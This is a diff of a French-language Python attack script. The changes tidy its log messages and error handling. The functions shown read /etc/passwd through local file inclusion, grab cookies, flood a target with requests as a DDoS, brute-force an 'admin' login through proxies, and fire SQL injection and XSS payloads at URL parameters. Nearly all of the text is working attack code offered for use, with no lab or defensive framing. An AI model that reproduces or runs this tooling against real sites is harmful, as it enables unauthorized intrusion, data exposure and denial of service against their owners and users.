@@ -35,27 +35,28 @@ def get_cookies(url):
             print(colored(f"[+] Cookies récupérés : {cookies}", "green"))
             return cookies
         else:
-            print(colored("[RAPPORT 🦠] Aucun cookie trouvé.", "red"))
+            print(colored("[-] Aucun cookie trouvé.", "red"))
             return None
     except requests.exceptions.RequestException as e:
         print(colored(f"[!] Erreur lors de la récupération des cookies : {e}", "red"))
         return None
 
 def lfi_test(url, file_path="/etc/passwd"):
-    print(colored("[INFO 🅾️] Test LFI en cours...", "yellow"))
+    print(colored("[*] Test LFI en cours...", "yellow"))
     try:
         response = requests.get(url, params={"file": file_path}, timeout=10)
         if response.status_code == 200 and "root:" in response.text:
             print(colored(f"[+] Inclusion réussie avec le fichier : {file_path}", "green"))
             return response.text[:500]  # Limiter l'affichage
         else:
-            print(colored("[INFO⛔] Inclusion échouée.", "red"))
+            print(colored("[-] Inclusion échouée.", "red"))
             return None
     except requests.exceptions.RequestException as e:
         print(colored(f"[!] Erreur lors du test LFI : {e}", "red"))
         return None
 
 def ddos_attack(target, max_requests=1000):
+    print(colored("[*] Lancement de l'attaque DDoS...", "yellow"))
     try:
         for _ in range(max_requests):
             response = requests.get(target, timeout=5)
@@ -84,6 +85,7 @@ def bruteforce_attack_with_proxies(url, username="admin", chars="abc123", max_le
     return None
 
 def advanced_sql_injection_test(url):
+    print(colored("[*] Lancement du test d'injection SQL avancée...", "yellow"))
     payloads = [
         "' OR 1=1 --", 
         "' UNION SELECT NULL, NULL, NULL --", 
@@ -91,11 +93,14 @@ def advanced_sql_injection_test(url):
         "' OR 'x'='x' --"
     ]
     for payload in payloads:
-        response = requests.get(url, params={'search': payload})
-        if "Welcome" in response.text:
-            print(f"[+] Injection réussie avec le payload: {payload}")
-        else:
-            print(colored(f"[-] L'injection avec le payload {payload} a échoué.", "red"))
+        try:
+            response = requests.get(url, params={'search': payload}, timeout=10)
+            if "Welcome" in response.text:
+                print(f"[+] Injection réussie avec le payload: {payload}")
+            else:
+                print(colored(f"[-] L'injection avec le payload {payload} a échoué.", "red"))
+        except requests.exceptions.RequestException as e:
+            print(colored(f"[!] Erreur lors de l'injection SQL : {e}", "red"))
 
 def xss_attack(url):
     print(colored("[*] Lancement de l'attaque XSS (Cross-Site Scripting)...", "yellow"))
@@ -106,7 +111,6 @@ def xss_attack(url):
     ]
     for payload in payloads:
         try:
-            # Exemple d'injection XSS via un paramètre URL
             response = requests.get(url, params={"input": payload}, timeout=10)
             if payload in response.text:
                 print(colored(f"[+] Vulnérabilité XSS détectée avec le payload : {payload}", "green"))
